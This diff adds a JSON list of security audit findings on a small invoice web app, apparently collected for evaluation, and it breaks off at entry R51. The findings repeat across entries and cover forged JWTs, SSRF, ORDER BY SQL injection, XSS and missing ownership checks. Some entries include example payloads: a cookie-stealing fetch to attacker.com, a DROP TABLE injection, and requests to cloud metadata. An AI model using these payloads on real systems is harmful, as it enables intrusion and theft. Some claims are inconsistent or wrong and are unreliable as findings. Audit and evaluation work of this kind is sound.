@@ -1,0 +1,823 @@
+{
+ "claims": [
+  {
+   "claim_id": "R01",
+   "title": "JWT Signature Verification Disabled",
+   "file": "lib/auth.js",
+   "line": "6",
+   "severity": "Critical",
+   "impact": "Complete authentication bypass - attackers can forge arbitrary JWT tokens with any user ID and role, gaining unauthorized access to all user-restricted endpoints.",
+   "evidence": "The currentUser() and tagRequest() functions use jwt.decode() instead of jwt.verify(). The decode() function only parses the JWT without validating the signature. Example: jwt.decode(bearer) at line 6 returns the token payload without any cryptographic verification, allowing forged tokens with arbitrary claims to be accepted as valid."
+  },
+  {
+   "claim_id": "R02",
+   "title": "Reflected XSS in invoiceNote() via unescaped HTML interpolation",
+   "file": "lib/render.js",
+   "line": "5",
+   "severity": "medium",
+   "impact": "If the rendered HTML is sent to the browser (as a JSON field, HTML email, or inline in an HTML page), an attacker can inject JavaScript to steal session cookies, perform actions as the user, redirect to a phishing page, or deface the page. The attack vector depends on where invoiceNote() output is consumed.",
+   "evidence": "Lines 4-6: function invoiceNote(note) {\n  return `<div class=\"note\">${note}</div>`;\n}\nThe `note` parameter is interpolated directly into an HTML string without escaping. If this HTML is sent to a browser in a response, any HTML/JavaScript in `note` executes."
+  },
+  {
+   "claim_id": "R03",
+   "title": "Server-Side Request Forgery via Unvalidated Logo URL",
+   "file": "routes/invoices.js",
+   "line": "38",
+   "severity": "high",
+   "impact": "An attacker can supply a URL pointing to internal services (127.0.0.1, private IP ranges, cloud metadata like 169.254.169.254), causing the server to fetch and return content from its own network position. This enables access to internal APIs, metadata services, and sensitive internal resources.",
+   "evidence": "router.post('/branding/preview', async (req, res) => { const image = await fetchLogo(req.body.logoUrl); res.type('image/png').send(image); }); fetchLogo (lib/remote.js line 5) accepts any URL, performs fetch(url, { redirect: 'follow' }), and has no domain validation. Contrast with fetchAsset (lines 11-15) which validates against ALLOWED hostnames."
+  },
+  {
+   "claim_id": "R04",
+   "title": "Server-Side Request Forgery (SSRF) in fetchLogo()",
+   "file": "lib/remote.js",
+   "line": "6",
+   "severity": "High",
+   "impact": "An attacker can make the application perform HTTP requests to arbitrary URLs, including internal services, localhost, and cloud metadata endpoints. This enables reconnaissance of internal infrastructure, potential access to internal APIs, and possibly exfiltration of sensitive data from internal services. The redirect: 'follow' setting amplifies the attack surface by following redirects to arbitrary locations.",
+   "evidence": "Lines 5-8: async function fetchLogo(url) { const response = await fetch(url, { redirect: 'follow' }); return Buffer.from(await response.arrayBuffer()); }. The 'url' parameter comes directly from req.body.logoUrl (line 38 in routes/invoices.js) with no validation. There is no whitelist, no domain check, and no redirect protection. Compare with fetchAsset() function (lines 11-16) which correctly validates the hostname against an ALLOWED whitelist."
+  },
+  {
+   "claim_id": "R05",
+   "title": "SQL Injection in Invoice Sort Parameter",
+   "file": "routes/invoices.js",
+   "line": "24",
+   "severity": "High",
+   "impact": "SQL injection allows attackers to manipulate database queries, potentially exfiltrating sensitive data, modifying records, or causing denial of service. An attacker could read all database contents or drop tables.",
+   "evidence": "Line 24 directly interpolates the unsanitized order parameter into the SQL query: `ORDER BY ${order}`. The order parameter comes directly from req.query.order with only a default value fallback. This contrasts sharply with the /payments endpoint (lines 29-34) which correctly uses a SORTABLE whitelist. SQL's syntax limitations prevent parameterization of ORDER BY clauses, making whitelist validation essential."
+  },
+  {
+   "claim_id": "R06",
+   "title": "JWT Token Forgery - Authentication Bypass",
+   "file": "lib/auth.js",
+   "line": "6",
+   "severity": "Critical",
+   "impact": "An attacker can forge arbitrary JWT tokens without requiring a valid signing key. This completely bypasses authentication, allowing unauthorized access to all protected endpoints. The attacker can assume any user identity, access other users' data, and execute any operation as that forged user. This is a critical authentication bypass vulnerability affecting all secured endpoints.",
+   "evidence": "Lines 6-7 use jwt.decode(bearer) instead of jwt.verify(bearer, secret). The jwt.decode() function only parses the token without verifying the signature. An attacker can create a token with arbitrary claims (sub, role, tenant) and the application will accept it as valid. Also present at line 12. Example: A forged token with {sub: '999', role: 'admin'} will be accepted as valid authentication."
+  },
+  {
+   "claim_id": "R07",
+   "title": "Server-Side Request Forgery (SSRF) in Logo Preview",
+   "file": "lib/remote.js",
+   "line": "3",
+   "severity": "HIGH",
+   "impact": "Attacker can make the server request arbitrary URLs, leading to access of internal services, cloud metadata exposure, or port scanning of internal networks",
+   "evidence": "fetchLogo() function accepts user-supplied URL with no validation. It calls fetch(url, { redirect: 'follow' }), allowing any URL including localhost, private IPs, and cloud metadata endpoints. Attacker can call POST /branding/preview with logoUrl='http://localhost:6379' to access Redis, or 'http://169.254.169.254/latest/meta-data/' to access cloud credentials."
+  },
+  {
+   "claim_id": "R08",
+   "title": "Server-Side Request Forgery (SSRF) - Unvalidated URL Fetching",
+   "file": "lib/remote.js",
+   "line": "5",
+   "severity": "Critical",
+   "impact": "Allows attackers to make the server perform HTTP requests to arbitrary URLs including internal services, cloud metadata endpoints (169.254.169.254), and internal APIs, leading to information disclosure and potential credential theft from cloud environments",
+   "evidence": "The fetchLogo() function accepts any URL parameter and passes it directly to fetch(url, { redirect: 'follow' }). No hostname whitelist is applied (unlike fetchAsset() which has one). This is called from POST /branding/preview endpoint with user-controlled req.body.logoUrl. Attackers can request http://169.254.169.254/latest/meta-data or http://localhost:6379 to access sensitive services."
+  },
+  {
+   "claim_id": "R09",
+   "title": "Authorization Bypass: Any Authenticated User Can Access Any Invoice",
+   "file": "routes/invoices.js",
+   "line": "12",
+   "severity": "HIGH",
+   "impact": "An authenticated attacker can retrieve invoices belonging to other users by manipulating the invoice ID parameter.",
+   "evidence": "Line 12-14: The /invoices/:id endpoint queries 'SELECT * FROM invoices WHERE id = $1' without checking the owner_id field. The /receipts/:id endpoint (line 18-22) correctly includes 'AND owner_id = $2' check, but the invoice endpoint omits this."
+  },
+  {
+   "claim_id": "R10",
+   "title": "Cross-Site Scripting (XSS) via Unescaped HTML in Invoice Notes",
+   "file": "lib/render.js",
+   "line": "4",
+   "severity": "HIGH",
+   "impact": "Stored XSS vulnerability allowing attackers to inject arbitrary JavaScript into invoice notes viewed by other users",
+   "evidence": "function invoiceNote(note) { return `<div class=\"note\">${note}</div>`; } - uses note directly without HTML escaping"
+  },
+  {
+   "claim_id": "R11",
+   "title": "Incomplete SQL Injection Mitigation in /payments Endpoint",
+   "file": "routes/invoices.js",
+   "line": "40",
+   "severity": "MEDIUM",
+   "impact": "Although the /payments endpoint uses a whitelist (SORTABLE), the pattern could be bypassed by edge cases or column injection if the whitelist is extended improperly.",
+   "evidence": "Line 38-42: The endpoint uses a whitelist-based approach (SORTABLE[req.query.sort] || SORTABLE.date), which is better than /invoices but still interpolates into the SQL query. If new columns are added to SORTABLE carelessly, the pattern could re-introduce SQL injection."
+  },
+  {
+   "claim_id": "R12",
+   "title": "SQL injection via ORDER BY clause in /invoices endpoint",
+   "file": "routes/invoices.js",
+   "line": "24",
+   "severity": "high",
+   "impact": "SQL injection allowing an attacker to: manipulate query results, extract sensitive data from other columns/tables, modify database state if UNION-based or stacked queries are possible, or cause denial of service through resource-exhaustive queries.",
+   "evidence": "Line 23-24: const order = req.query.order || 'created_at'; followed by: db.query(`SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}`, [req.user.id]). The order parameter from the query string is interpolated directly into the SQL query using template literals, without parameterization or allowlist validation."
+  },
+  {
+   "claim_id": "R13",
+   "title": "Undefined Return Value in tagRequest Function",
+   "file": "lib/auth.js",
+   "line": "14",
+   "severity": "MEDIUM",
+   "impact": "Function returns undefined instead of the tagged request object, breaking metric tagging and returning wrong data to callers",
+   "evidence": "function tagRequest(req, metrics) { ... return req.session.user; } where req.session.user is never set by any prior code (req.session is never initialized)"
+  },
+  {
+   "claim_id": "R14",
+   "title": "Indirect Object Reference (IDOR) in Invoice Detail Endpoint",
+   "file": "routes/invoices.js",
+   "line": "8",
+   "severity": "HIGH",
+   "impact": "Unauthorized access to invoices: users can read invoices belonging to other customers by guessing or enumerating invoice IDs",
+   "evidence": "router.get('/invoices/:id', ...) executes SELECT * FROM invoices WHERE id = $1 without checking owner_id, while the /receipts/:id endpoint on line 13 correctly includes AND owner_id = $2"
+  },
+  {
+   "claim_id": "R15",
+   "title": "HTML injection in invoice note field",
+   "file": "lib/render.js",
+   "line": "4-5",
+   "severity": "high",
+   "impact": "An attacker can inject arbitrary HTML and JavaScript into the page, stealing session cookies, redirecting users, phishing, or defacing the invoice.",
+   "evidence": "The invoiceNote(note) function returns `<div class=\"note\">${note}</div>` without escaping. The customerName(name) function (lines 9-10) correctly uses escapeHtml(name). If invoiceNote is used to render user-supplied content, an attacker can inject HTML and JavaScript: `<img src=x onerror='fetch(\"http://attacker.com?cookie=\"+document.cookie)'>`."
+  },
+  {
+   "claim_id": "R16",
+   "title": "Server-Side Request Forgery (SSRF) in Logo Fetching",
+   "file": "lib/remote.js",
+   "line": "5",
+   "severity": "HIGH",
+   "impact": "The fetchLogo() function fetches arbitrary URLs without validation. An attacker can cause the server to make requests to internal addresses (localhost:6379 for Redis, 169.254.169.254 for AWS metadata, internal databases) or arbitrary external servers, potentially exposing internal data or enabling attack pivots.",
+   "evidence": "fetchLogo() at line 5 accepts any URL and calls fetch(url) with only redirect: 'follow'. No hostname validation occurs. Contrast with fetchAsset() which has whitelist validation on line 11."
+  },
+  {
+   "claim_id": "R17",
+   "title": "SQL Injection via ORDER BY Parameter",
+   "file": "routes/invoices.js",
+   "line": "19",
+   "severity": "CRITICAL",
+   "impact": "The /invoices endpoint constructs a SQL query by directly interpolating the user-supplied req.query.order parameter into the ORDER BY clause. An attacker can provide a malicious ORDER BY clause that modifies the SQL statement, potentially exfiltrating sensitive data, modifying records, or executing arbitrary SQL code.",
+   "evidence": "const order = req.query.order || 'created_at'; ... ORDER BY ${order} at line 19. The order parameter is inserted directly into the query string without parameterization or validation. This violates SQL injection prevention best practices."
+  },
+  {
+   "claim_id": "R18",
+   "title": "SSRF Vulnerability - Unvalidated URL Fetching with Redirect Following",
+   "file": "lib/remote.js",
+   "line": "5",
+   "severity": "HIGH",
+   "impact": "The fetchLogo() function accepts a user-provided URL and fetches it with redirect: 'follow'. An attacker can provide a URL that redirects to internal systems (127.0.0.1:8080, 169.254.169.254 AWS metadata, internal databases) to exfiltrate configuration, credentials, or trigger internal service attacks. The lack of validation allows any URL.",
+   "evidence": "async function fetchLogo(url) { const response = await fetch(url, { redirect: 'follow' }); ... } at line 5. The url parameter is taken directly from req.body.logoUrl (routes/invoices.js line 37) with no validation. The redirect: 'follow' setting means an attacker-controlled initial URL can redirect to any target."
+  },
+  {
+   "claim_id": "R19",
+   "title": "Unverified JWT authentication allows token forgery",
+   "file": "lib/auth.js",
+   "line": "6",
+   "severity": "critical",
+   "impact": "An attacker can forge a JWT with arbitrary claims (sub, role, tenant) and impersonate any user, including administrative accounts. All authorization checks depend on req.user.id and req.user.role, which are derived from unverified JWT claims. This grants full access to all API endpoints and all user data.",
+   "evidence": "Lines 4-8: function currentUser(req) {\n  const bearer = (req.headers.authorization || '').replace('Bearer ', '');\n  const claims = jwt.decode(bearer);\n  return { id: claims && claims.sub, role: claims && claims.role };\n}\nThe code calls jwt.decode() which only decodes the JWT payload without verifying the signature. Any JWT can be forged by an attacker."
+  },
+  {
+   "claim_id": "R20",
+   "title": "Unescaped HTML in server-rendered note field",
+   "file": "lib/render.js",
+   "line": "5",
+   "severity": "medium",
+   "impact": "An attacker can inject HTML and JavaScript into the note field. If this HTML is rendered in a browser context without a strict Content-Security-Policy, it executes JavaScript in the victim's browser, allowing cookie theft or account takeover.",
+   "evidence": "Line 5: `return '<div class=\"note\">${note}</div>';` returns user input directly without HTML escaping. Line 10 shows the correct pattern: `escapeHtml(name)` is used in customerName function, demonstrating that the codebase has the `escape-html` package available but does not use it for the invoiceNote function."
+  },
+  {
+   "claim_id": "R21",
+   "title": "Unauthenticated and Unauthorized Access to Invoice Details",
+   "file": "routes/invoices.js",
+   "line": "8",
+   "severity": "High",
+   "impact": "Allows any user (authenticated or not) to access any invoice in the system by guessing invoice IDs. This enables information disclosure, enumeration of all invoices, and potentially exposes sensitive financial data, customer information, and payment details.",
+   "evidence": "The GET /invoices/:id endpoint (lines 7-10) lacks both authentication and authorization checks. It does not reference req.user.id and performs no ownership validation. The database query `SELECT * FROM invoices WHERE id = $1` returns the invoice regardless of who requests it. Compare with /receipts/:id endpoint (lines 13-19) which correctly includes `AND owner_id = $2` check using req.user.id. An attacker can simply iterate through invoice IDs to extract all financial records from the system."
+  },
+  {
+   "claim_id": "R22",
+   "title": "SQL injection in ORDER BY clause without parameterization",
+   "file": "routes/invoices.js",
+   "line": "24",
+   "severity": "high",
+   "impact": "An attacker can inject arbitrary SQL into the ORDER BY clause. While this particular query may have limited direct impact due to the parameterized WHERE clause, attackers could use ORDER BY injection to extract data through timing attacks or cause a denial of service.",
+   "evidence": "Line 24: `const rows = await db.query('SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}', [req.user.id]);` uses template literal interpolation for the ORDER BY value. The order variable comes from req.query.order (line 23) with no validation. Contrast with line 31 in the /payments handler which uses an allowlist (SORTABLE object) to map user input to safe column names."
+  },
+  {
+   "claim_id": "R23",
+   "title": "SSRF vulnerability in fetchLogo function",
+   "file": "lib/remote.js",
+   "line": "5",
+   "severity": "critical",
+   "impact": "An attacker can make the server fetch arbitrary URLs, including internal services (localhost, private IP ranges), metadata endpoints (AWS/GCP), or trigger attacks on external targets. Can lead to information disclosure, credential theft, or DoS.",
+   "evidence": "Lines 5-8: `async function fetchLogo(url) { const response = await fetch(url, { redirect: 'follow' }); return Buffer.from(await response.arrayBuffer()); }` - No hostname validation, no URL parsing, accepts arbitrary URLs. The ALLOWED allowlist (line 2) is defined but only used in fetchAsset(), not fetchLogo(). The 'redirect: follow' allows an attacker to chain redirects from public URLs to internal services."
+  },
+  {
+   "claim_id": "R24",
+   "title": "Broken object-level authorization on invoice detail endpoint",
+   "file": "routes/invoices.js",
+   "line": "8",
+   "severity": "high",
+   "impact": "Any authenticated user can read any other user's invoice by manipulating the :id parameter. The /receipts/:id endpoint correctly scopes to the caller's receipts, creating an asymmetry that exposes invoices across users.",
+   "evidence": "Line 8: `SELECT * FROM invoices WHERE id = $1` queries only by invoice id without filtering by owner. Contrast with line 15: `/receipts/:id` which includes `AND owner_id = $2` to filter by the authenticated user's id."
+  },
+  {
+   "claim_id": "R25",
+   "title": "Unauthorized Access to Invoice Data - Missing Owner Verification",
+   "file": "routes/invoices.js",
+   "line": "8",
+   "severity": "CRITICAL",
+   "impact": "The /invoices/:id endpoint returns invoice data without verifying ownership. An attacker can access any invoice by guessing or enumerating invoice IDs, exposing sensitive billing information belonging to other users. This is a direct authorization bypass.",
+   "evidence": "Line 8: const invoice = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]). This filters only by id, not by owner_id. Contrast with /receipts/:id at lines 12-17 which correctly filters by both id AND owner_id: WHERE id = $1 AND owner_id = $2."
+  },
+  {
+   "claim_id": "R26",
+   "title": "Stored XSS vulnerability in invoiceNote function",
+   "file": "lib/render.js",
+   "line": "4",
+   "severity": "high",
+   "impact": "An attacker can inject arbitrary JavaScript that executes in the browser of other users viewing the same invoice, enabling session hijacking, credential theft, or malware distribution",
+   "evidence": "Lines 4-6: `function invoiceNote(note) { return \\`<div class=\"note\">${note}</div>\\`; }` - The note parameter is directly interpolated into HTML without any escaping. Contrast with customerName() (lines 9-11) which correctly uses escapeHtml(name). An attacker can create an invoice with note='<script>alert(1)</script>' or '<img src=x onerror=fetch(..attacked_server..)>'"
+  },
+  {
+   "claim_id": "R27",
+   "title": "Server-Side Request Forgery (SSRF) in fetchLogo endpoint",
+   "file": "lib/remote.js",
+   "line": "6",
+   "severity": "high",
+   "impact": "An attacker can use the SSRF to: access internal network services (databases, admin panels), query cloud metadata services (AWS IMDSv1 at 169.254.169.254), access file:// URLs, or amplify attacks against third-party services. The redirect: 'follow' option amplifies the risk by allowing redirect-based bypasses.",
+   "evidence": "The fetchLogo() function at line 5-8 accepts a user-supplied URL from req.body.logoUrl (invoked from routes/invoices.js line 38) and fetches it without validation: fetch(url, {redirect: 'follow'}). No allowlist, no scheme validation, no hostname validation."
+  },
+  {
+   "claim_id": "R28",
+   "title": "SQL Injection in ORDER BY Parameter",
+   "file": "routes/invoices.js",
+   "line": "24",
+   "severity": "High",
+   "impact": "Arbitrary SQL command execution allowing data exfiltration, modification, or destruction of database tables",
+   "evidence": "Line 24 directly interpolates req.query.order into SQL template: const rows = await db.query(`SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}`, [req.user.id]); Parameter sourced from user input with no sanitization. Contrast: /payments endpoint at line 31 correctly uses whitelist SORTABLE filtering"
+  },
+  {
+   "claim_id": "R29",
+   "title": "JWT Signature Verification Missing - Authentication Bypass",
+   "file": "lib/auth.js",
+   "line": "6",
+   "severity": "Critical",
+   "impact": "Complete authentication bypass allowing attackers to forge any JWT token and impersonate any user without knowing the signing secret",
+   "evidence": "Function uses jwt.decode() without jwt.verify(); no secret key validation. Line 6: const claims = jwt.decode(bearer); Attacker can create JWT with arbitrary payload and send it with any signature"
+  },
+  {
+   "claim_id": "R30",
+   "title": "Cross-Site Scripting (XSS) in Invoice Notes",
+   "file": "lib/render.js",
+   "line": "5",
+   "severity": "High",
+   "impact": "XSS allows attackers to execute arbitrary JavaScript in user browsers, enabling session hijacking, cookie theft, credential harvesting, malware injection, and unauthorized actions performed on behalf of the user.",
+   "evidence": "The invoiceNote(note) function at lines 4-6 fails to escape HTML despite the escape-html library being imported and used correctly in customerName() function (line 10). The note parameter is directly interpolated: `<div class='note'>${note}</div>`. An attacker controlling the invoice note field (e.g., via database injection or direct record creation) can inject malicious HTML/JavaScript. The inconsistency with customerName() demonstrates this is a security oversight, not intentional design."
+  },
+  {
+   "claim_id": "R31",
+   "title": "SQL Injection via Unsanitized ORDER BY Parameter",
+   "file": "routes/invoices.js",
+   "line": "24",
+   "severity": "Critical",
+   "impact": "Complete database compromise. Attacker can execute arbitrary SQL queries including SELECT, INSERT, UPDATE, DELETE, and DROP TABLE commands. Can extract sensitive data, modify invoices, delete records, or destroy tables entirely.",
+   "evidence": "Line 24 contains: `ORDER BY ${order}` where `order` is directly concatenated from `req.query.order` without validation or parameterization. No whitelist or prepared statement used for the ORDER BY clause, unlike the correctly-implemented /payments endpoint which uses SORTABLE whitelist."
+  },
+  {
+   "claim_id": "R32",
+   "title": "Unvalidated URL fetch enables SSRF attacks",
+   "file": "lib/remote.js",
+   "line": "routes/invoices.js:38",
+   "severity": "high",
+   "impact": "An attacker can read data from internal services (metadata endpoints, admin panels, private APIs) or internal network resources, or trigger actions on internal services.",
+   "evidence": "The fetchLogo(url) function at lib/remote.js:5-8 accepts any URL and fetches it via node-fetch without validation. The /branding/preview endpoint (routes/invoices.js:38) calls fetchLogo(req.body.logoUrl) directly with user input. An attacker can supply http://localhost:8080/admin or http://169.254.169.254/latest/meta-data/ to access internal services."
+  },
+  {
+   "claim_id": "R33",
+   "title": "JWT Token Not Verified - Uses jwt.decode() Instead of jwt.verify()",
+   "file": "lib/auth.js",
+   "line": "5",
+   "severity": "CRITICAL",
+   "impact": "An unauthenticated attacker can forge arbitrary JWT tokens without knowing the secret key. The currentUser() function uses jwt.decode() which only parses the token without validating the signature. An attacker can create any claims (id, role, tenant) and impersonate any user.",
+   "evidence": "const claims = jwt.decode(bearer); - Line 5. jwt.decode() is a parsing function that does NOT validate the signature. The jsonwebtoken library provides jwt.verify() for secure validation, which is not being used."
+  },
+  {
+   "claim_id": "R34",
+   "title": "SQL injection in ORDER BY clause via unsanitized user input",
+   "file": "routes/invoices.js",
+   "line": "24",
+   "severity": "high",
+   "impact": "An attacker can inject arbitrary SQL into the ORDER BY clause. Since parameterized queries are used for the WHERE condition but not the ORDER BY, an attacker can exfiltrate data, modify query logic, or in some databases execute operating system commands. Example payload: `order=created_at; DROP TABLE invoices; --`.",
+   "evidence": "Line 24: const order = req.query.order || 'created_at';\n         db.query(`SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}`, [req.user.id])\nThe `order` parameter from the query string is interpolated directly into the SQL ORDER BY clause without validation or parameterization."
+  },
+  {
+   "claim_id": "R35",
+   "title": "Broken Object-Level Authorization in /receipts/:id",
+   "file": "routes/invoices.js",
+   "line": "16",
+   "severity": "high",
+   "impact": "An attacker can forge a JWT with any sub claim, access the /receipts/:id endpoint, and read any user's receipts by guessing or enumerating receipt IDs. This combines two vulnerabilities: missing JWT verification (F-003) and broken BOLA.",
+   "evidence": "router.get('/receipts/:id', async (req, res) => { const receipt = await db.query('SELECT * FROM receipts WHERE id = $1 AND owner_id = $2', [req.params.id, req.user.id]); res.json(receipt); }); The authorization check filters by owner_id = $2, but req.user.id comes from lib/auth.js line 7, which extracts claims from an unverified JWT (jwt.decode() without jwt.verify()). An attacker can forge a JWT with any sub claim."
+  },
+  {
+   "claim_id": "R36",
+   "title": "Open Redirect / Unvalidated Redirect in SSRF",
+   "file": "lib/remote.js",
+   "line": "6",
+   "severity": "HIGH",
+   "impact": "The fetchLogo() function uses redirect: 'follow' allowing HTTP redirects. An attacker could exploit a third-party's open redirect to bypass hostname validation and trigger SSRF to internal addresses. A malicious host could redirect to localhost, internal IP addresses, or other sensitive services.",
+   "evidence": "Line 6: await fetch(url, { redirect: 'follow' }) allows following redirects. This is set to 'error' in fetchAsset() on line 14, which is more restrictive. With redirect: 'follow', even if initial validation existed, the server could be redirected to internal addresses."
+  },
+  {
+   "claim_id": "R37",
+   "title": "JWT Token Verification Bypass",
+   "file": "lib/auth.js",
+   "line": "6",
+   "severity": "HIGH",
+   "impact": "Authentication bypass: attackers can forge JWT tokens without a valid signature as jwt.decode() does not verify the token signature",
+   "evidence": "const claims = jwt.decode(bearer); - uses jwt.decode() which only parses the token without verifying the signature against a secret key"
+  },
+  {
+   "claim_id": "R38",
+   "title": "Cross-Site Scripting in invoiceNote Template Function",
+   "file": "lib/render.js",
+   "line": "5",
+   "severity": "medium",
+   "impact": "If the rendered HTML is sent to a browser, an attacker can inject arbitrary JavaScript, steal cookies, perform actions on behalf of the user, or redirect the user to a malicious site.",
+   "evidence": "function invoiceNote(note) { return `<div class=\"note\">${note}</div>`; } The note parameter is inserted directly into HTML without escaping. Contrast with customerName (line 10) which calls escapeHtml(). If note contains <script>alert('xss')</script>, it will be rendered as HTML."
+  },
+  {
+   "claim_id": "R39",
+   "title": "Missing authentication and authorization on invoice endpoints",
+   "file": "routes/invoices.js",
+   "line": "13-19",
+   "severity": "critical",
+   "impact": "An attacker can read any invoice or receipt by guessing or enumerating IDs. Combined with the JWT vulnerability (F-001), an attacker can assume any user's identity and access all their data.",
+   "evidence": "The /invoices/:id endpoint (line 7-10) has no authentication check and no authorization check. It simply returns all data for the requested ID without verifying the user owns it. The /receipts/:id endpoint (line 13-19) checks req.user.id, but req.user is never set in the visible code; no authentication middleware is attached."
+  },
+  {
+   "claim_id": "R40",
+   "title": "Server-Side Request Forgery (SSRF) in Logo Fetching",
+   "file": "lib/remote.js",
+   "line": "6",
+   "severity": "High",
+   "impact": "Unauthorized access to internal resources. Attacker can probe internal IP ranges, access cloud metadata endpoints (AWS, GCP, Azure), read AWS credentials and tokens, access internal services bypassing firewalls, and perform port scanning on internal network. Can escalate to full infrastructure compromise.",
+   "evidence": "Line 6: `const response = await fetch(url, { redirect: 'follow' });` accepts any URL without hostname validation. Used by POST /branding/preview endpoint which passes req.body.logoUrl directly to fetchLogo(). Unlike fetchAsset() on line 13 which enforces ALLOWED whitelist, fetchLogo() has zero restrictions on which hosts can be accessed."
+  },
+  {
+   "claim_id": "R41",
+   "title": "JWT Authentication Bypass via Unverified Token Decoding",
+   "file": "lib/auth.js",
+   "line": "6",
+   "severity": "Critical",
+   "impact": "Complete authentication system failure - any attacker can forge arbitrary JWT tokens without knowing the signing key and impersonate any user, bypassing all access controls. This enables unauthorized access to all user data including invoices, receipts, and payment information. Can lead to privilege escalation if attacker claims admin role.",
+   "evidence": "Lines 4-8 and 11-15: Functions currentUser() and tagRequest() use jwt.decode() instead of jwt.verify(). The jwt.decode() function only performs base64 decoding without signature verification. No signing key is used, no try-catch error handling for invalid tokens, allowing any JWT with any claims to be accepted as valid."
+  },
+  {
+   "claim_id": "R42",
+   "title": "Cross-Site Scripting (XSS) in Invoice Notes - Unescaped HTML",
+   "file": "lib/render.js",
+   "line": "5",
+   "severity": "High",
+   "impact": "Arbitrary JavaScript execution in user browser context allowing cookie theft, session hijacking, credential harvesting, and malware injection",
+   "evidence": "Function invoiceNote() at line 5 renders note without escaping: return `<div class=\"note\">${note}</div>`. Module imports escape-html at line 1 and uses it correctly in customerName() at line 10, but omits escaping in invoiceNote(). User-controlled note content flows directly into HTML template"
+  },
+  {
+   "claim_id": "R43",
+   "title": "SQL Injection via Unsanitized ORDER BY Parameter",
+   "file": "routes/invoices.js",
+   "line": "24",
+   "severity": "CRITICAL",
+   "impact": "SQL injection allows attackers to read/modify/delete arbitrary database records via the sort parameter in the /invoices endpoint",
+   "evidence": "const rows = await db.query(`SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}`, [req.user.id]); where order = req.query.order || 'created_at' and no validation exists"
+  },
+  {
+   "claim_id": "R44",
+   "title": "SSRF in user-supplied URL fetching without validation",
+   "file": "lib/remote.js",
+   "line": "6",
+   "severity": "high",
+   "impact": "An attacker can supply internal network URLs (e.g., 169.254.169.254/latest/meta-data on AWS to steal credentials, or http://localhost:8080 to access internal services). The server will make the request from its privileged network position and return the response to the attacker.",
+   "evidence": "Line 6: `const response = await fetch(url, { redirect: 'follow' });` accepts the user-supplied URL directly from req.body.logoUrl (called on line 38 of routes/invoices.js) with no validation. The function allows redirects, which defeats simple hostname checks. The fetchAsset function (lines 11-16) shows correct allowlist-based validation, but fetchLogo has none."
+  },
+  {
+   "claim_id": "R45",
+   "title": "SQL Injection via unsanitized ORDER BY clause",
+   "file": "routes/invoices.js",
+   "line": "24",
+   "severity": "critical",
+   "impact": "An attacker can inject arbitrary SQL statements to extract, modify, or delete database records, bypassing authorization controls",
+   "evidence": "Line 24: `const rows = await db.query(\\`SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}\\`, [req.user.id]);` - The 'order' parameter from req.query is directly interpolated into the SQL string without parameterization or validation. While a default value is provided, user input is trusted entirely. An attacker can supply values like '(CASE WHEN ...) -- ' to execute arbitrary SQL."
+  },
+  {
+   "claim_id": "R46",
+   "title": "Server-Side Request Forgery (SSRF) in fetchLogo Function",
+   "file": "lib/remote.js",
+   "line": "6",
+   "severity": "High",
+   "impact": "Attacker can abuse the /branding/preview endpoint to make the server perform HTTP requests to arbitrary URLs, enabling: (1) access to cloud metadata endpoints (169.254.169.254) to steal AWS credentials; (2) port scanning of internal networks; (3) access to internal services and databases; (4) reading local files via file:// protocol in some environments; (5) denial of service through resource exhaustion.",
+   "evidence": "Lines 5-8: async function fetchLogo(url) { const response = await fetch(url, { redirect: 'follow' }); } The function accepts any URL parameter without validation, whitelist checks, or protocol restrictions. The redirect: 'follow' option amplifies the attack surface. Contrast with fetchAsset() function (lines 11-16) which correctly implements a domain whitelist (ALLOWED set), demonstrating that developers knew about this vulnerability but failed to apply the same protection pattern."
+  },
+  {
+   "claim_id": "R47",
+   "title": "Cross-Site Scripting (XSS) in invoiceNote Function",
+   "file": "lib/render.js",
+   "line": "5",
+   "severity": "High",
+   "impact": "Attacker can inject malicious JavaScript into invoice notes, compromising any user viewing that invoice. Can lead to: (1) session hijacking and account takeover via cookie/token theft; (2) credential harvesting through fake login forms; (3) malware distribution; (4) keylogging; (5) phishing redirection. If admin users view compromised invoices, entire application can be compromised.",
+   "evidence": "Lines 4-6: function invoiceNote(note) { return `<div class=\"note\">${note}</div>`; } User-supplied note parameter is directly inserted into HTML without any escaping. The same file contains customerName() function (lines 9-11) which correctly uses escapeHtml() on user data: `${escapeHtml(name)}` This shows inconsistent security practices within the same module - proof that developers knew to escape but failed to apply it consistently."
+  },
+  {
+   "claim_id": "R48",
+   "title": "XSS Vulnerability in Invoice Note Rendering",
+   "file": "lib/render.js",
+   "line": "4",
+   "severity": "HIGH",
+   "impact": "User-supplied invoice notes can inject arbitrary HTML/JavaScript into the rendered invoice, leading to session hijacking, credential theft, or malware distribution.",
+   "evidence": "Line 4: 'function invoiceNote(note) { return `<div class=\\'note\\'>${note}</div>`; }' - the note parameter is directly interpolated without escaping. While escapeHtml is imported and used in customerName(), it is NOT used for invoiceNote()."
+  },
+  {
+   "claim_id": "R49",
+   "title": "Missing Authorization Check on Invoice Retrieval",
+   "file": "routes/invoices.js",
+   "line": "7",
+   "severity": "HIGH",
+   "impact": "The GET /invoices/:id endpoint does not verify that the requesting user owns the invoice. An unauthenticated attacker or any authenticated user can retrieve any invoice by guessing or enumerating invoice IDs. This allows unauthorized access to sensitive billing data.",
+   "evidence": "router.get('/invoices/:id', async (req, res) => { const invoice = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]); res.json(invoice); }); at line 7. No check of req.user.id or req.user.role. Compare with /receipts/:id at line 12, which correctly includes AND owner_id = $2 in the query."
+  },
+  {
+   "claim_id": "R50",
+   "title": "JWT signature verification bypassed via jwt.decode() instead of jwt.verify()",
+   "file": "lib/auth.js",
+   "line": "6",
+   "severity": "critical",
+   "impact": "An attacker can forge a JWT token with any user ID and role, bypassing all authentication and authorization checks. Since these claims are used directly in authorization decisions (e.g., line 21 in routes/invoices.js: req.user.id from a decoded token without verification), an attacker can access or modify any user's data.",
+   "evidence": "const claims = jwt.decode(bearer); \u2014 the decode() call does not validate the signature. Any attacker can forge a token with arbitrary claims (sub, role, tenant) and pass authentication."
+  },
+  {
+   "claim_id": "R51",
+   "title": "Unverified JWT Token Acceptance - Authentication Bypass",
